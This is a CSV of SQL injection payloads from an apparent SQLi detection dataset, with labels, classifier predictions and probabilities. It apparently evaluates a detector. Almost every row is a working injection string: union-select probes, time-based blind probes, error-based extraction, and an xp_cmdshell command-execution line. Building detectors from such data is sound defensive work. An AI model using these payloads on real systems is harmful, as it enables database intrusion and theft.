text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
asc,sajid576/sql-injection-dataset,134,1,0,3.6480414564721286e-05,0
"select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
"select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"""hi""""  )   or   (  """"a""""  =  """"a""",sajid576/sql-injection-dataset,142,1,1,0.9999929666519165,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,sajid576/sql-injection-dataset,145,1,1,0.9998431205749512,1
"select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
"select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
x' or 1  =  1 or 'x'  =  'y,sajid576/sql-injection-dataset,154,1,1,0.999992847442627,1
"select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  '1' union select \.,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999926090240479,1
"select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
PRINT @@variable,sajid576/sql-injection-dataset,166,1,0,3.225034743081778e-05,0
"select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999927282333374,1
"select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  '1' union select +\,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
@var select @var as var into temp end --,sajid576/sql-injection-dataset,176,1,1,0.999988317489624,1
"select * from users where id  =  1 +   (  \.  )   union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
t'exec master..xp_cmdshell 'nslookup www.googl ...,sajid576/sql-injection-dataset,145,1,1,0.9033918976783752,1
"select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
"select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  1 or \.<\ union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
"select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
"select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999929666519165,1
(  sqlvuln  ),sajid576/sql-injection-dataset,186,1,1,0.9999924898147583,1
"select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",sajid576/sql-injection-dataset,7,1,1,0.999992847442627,1
create user name identified by 'pass123',sajid576/sql-injection-dataset,196,1,1,0.9999845027923584,1
"select * from users where id  =  1.*\ union select null,@@VERSION -- 1",sajid576/sql-injection-dataset,7,1,1,0.9999926090240479,1
"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )",sajid576/sql-injection-dataset,207,1,1,0.999993085861206,1
"1""  )   as ztkr where 1532  =  1532",sajid576/sql-injection-dataset,218,1,1,0.9999932050704956,1
-5021'+  (  select yadq where 4285  =  4285 order by 1#,sajid576/sql-injection-dataset,227,1,1,0.999993085861206,1
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",sajid576/sql-injection-dataset,230,1,1,0.9999926090240479,1
"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,244,1,1,0.9999933242797852,1
-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,sajid576/sql-injection-dataset,254,1,1,0.999993085861206,1
-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-3721'  )   union all select 9050,9050--",sajid576/sql-injection-dataset,273,1,1,0.999993085861206,1
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ),sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-7686%""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,301,1,1,0.999993085861206,1
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""tfok"" like ""tfok",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999932050704956,1
1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,sajid576/sql-injection-dataset,320,1,1,0.9999932050704956,1
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,324,1,1,0.9999929666519165,1
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'wjwn'  =  'wjwn",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-1065   )    )    union all select 7437,7437,7437,7437,7437,7437,7437,7437--",sajid576/sql-injection-dataset,334,1,1,0.9999932050704956,1
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1'||  (  select 'ftey' where 1363  =  1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,349,1,1,0.9999932050704956,1
-5137  )   or 9323  =  9323#,sajid576/sql-injection-dataset,350,1,1,0.999993085861206,1
-3100'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'etuj' like 'etuj,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
-6233'  )   where 9820  =  9820 or 3038  =  3038,sajid576/sql-injection-dataset,359,1,1,0.9999932050704956,1
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
-7111' or   (  8459  =  8459  )  *4906,sajid576/sql-injection-dataset,372,1,1,0.999993085861206,1
"-2323""  )   as zgsn where 9274  =  9274 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",sajid576/sql-injection-dataset,263,1,1,0.9999933242797852,1
-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"iif  (  3204  =  8489,3204,1/0  )",sajid576/sql-injection-dataset,381,1,1,0.999993085861206,1
"-2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",sajid576/sql-injection-dataset,391,1,1,0.9999926090240479,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #,sajid576/sql-injection-dataset,402,1,1,0.9999929666519165,1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )",sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-2548""   )    )     )   or 5107  =  8049--",sajid576/sql-injection-dataset,416,1,1,0.9999932050704956,1
"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sajid576/sql-injection-dataset,422,1,1,0.9999933242797852,1
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",sajid576/sql-injection-dataset,427,1,1,0.9999916553497314,1
-8007'   )    )    as bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',sajid576/sql-injection-dataset,436,1,1,0.9999932050704956,1
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxnj"" like ""mxnj",sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --,sajid576/sql-injection-dataset,448,1,1,0.9999932050704956,1
1   )    )     )   waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,114,1,1,0.999992847442627,1
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",sajid576/sql-injection-dataset,459,1,1,0.9999932050704956,1
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""pqsp""  =  ""pqsp",sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",sajid576/sql-injection-dataset,470,1,1,0.9999933242797852,1
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1'||  (  select 'tvcy' where 5592  =  5592 order by 1#,sajid576/sql-injection-dataset,479,1,1,0.9999932050704956,1
1'  )   where 7908  =  7908 or sleep  (  5  )  --,sajid576/sql-injection-dataset,492,1,1,0.9999932050704956,1
"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx,sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
"1""   )    )    and 2006  =  2006",sajid576/sql-injection-dataset,499,1,1,0.999993085861206,1
"-6076""   )    )    or 8277  =  4757",sajid576/sql-injection-dataset,502,1,1,0.999993085861206,1
"-2314%'   )    )    union all select 4612,4612--",sajid576/sql-injection-dataset,515,1,1,0.9999932050704956,1
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',sajid576/sql-injection-dataset,524,1,1,0.9999932050704956,1
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,sajid576/sql-injection-dataset,534,1,1,0.999993085861206,1
"1'+  (  select 'zirh' where 9054  =  9054 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",sajid576/sql-injection-dataset,545,1,1,0.9999932050704956,1
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",sajid576/sql-injection-dataset,555,1,1,0.9999932050704956,1
"-5204""  )   union all select 7186,7186,7186--",sajid576/sql-injection-dataset,565,1,1,0.9999932050704956,1
"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",sajid576/sql-injection-dataset,575,1,1,0.9999933242797852,1
(  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7992  =  7992  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    ),sajid576/sql-injection-dataset,263,1,1,0.999993085861206,1
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ),sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--,sajid576/sql-injection-dataset,584,1,1,0.9999932050704956,1
1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,sajid576/sql-injection-dataset,594,1,1,0.9999932050704956,1
1'   )    )    as mqnv where 9831  =  9831,sajid576/sql-injection-dataset,603,1,1,0.9999932050704956,1
begin dbms_lock.sleep  (  5  ),sajid576/sql-injection-dataset,613,1,1,0.9999926090240479,1
"-9039'  )   union all select 8058,8058,8058,8058,8058--",sajid576/sql-injection-dataset,617,1,1,0.9999932050704956,1
"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",sajid576/sql-injection-dataset,629,1,1,0.9999932050704956,1
1   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   5281  =  5281,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
